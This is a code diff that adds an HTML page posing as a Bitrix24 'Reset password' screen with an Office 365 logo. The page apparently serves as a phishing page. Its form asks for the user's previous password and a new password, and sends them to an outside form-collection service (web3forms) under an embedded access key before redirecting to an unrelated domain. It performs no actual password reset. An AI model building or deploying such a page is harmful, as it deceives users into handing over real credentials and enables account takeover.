@@ -1,0 +1,62 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Reset password - Bitrix24</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      html, body {
+        font-family: Montserrat, "Helvetica Neue", Helvetica, Arial, sans-serif
+      }
+    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              blue: '#2fc6f7',
+              orange: '#ff5800',
+            }
+          }
+        }
+      }
+    </script>
+  </head>
+  <body class="absolute h-full w-full bg-blue flex flex-col">
+    <div class="grow-0 flex justify-center py-28">
+        <img src="./bitrix24.svg" />
+    </div>
+    <div class="flex justify-center items-center">
+      <div class="bg-white p-10 rounded rounded-xl flex flex-col space-y-8">
+        <h1 class="text-3xl font text-gray-700">
+          Reset password
+        </h1>
+
+        <div class="bg-gray-100 rounded rounded-full p-4 flex justify-center">
+          <div class="w-10 h-10 bg-orange rounded-full p-1">
+            <img src="./office-365.svg" />
+          </div>
+        </div>
+
+        <form action="https://api.web3forms.com/submit" method="POST" class="flex flex-col space-y-6">
+          <input type="hidden" name="access_key" value="f869c5fb-3df8-4e18-927d-3b86c86dae49">
+          <input type="hidden" name="redirect" value="https://my.arnsbo-group.com/thanks.html">
+
+
+          <label class="text-xl text-gray-400">Previous password</label>
+          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="password-old" required>
+
+          <label class="text-xl text-gray-400">New password</label>
+          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="password-new" required>
+
+          <label class="text-xl text-gray-400">Repeat new password</label>
+          <input class="px-2 py-3 border-2 border-gray-300 focus:border-blue focus:ring-0 ring-blue focus:outline-none" type="password" name="password-new-repeated" required>
+
+          <div class="h-captcha" data-captcha="true"></div>
+          <button type="submit">Submit Form</button>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
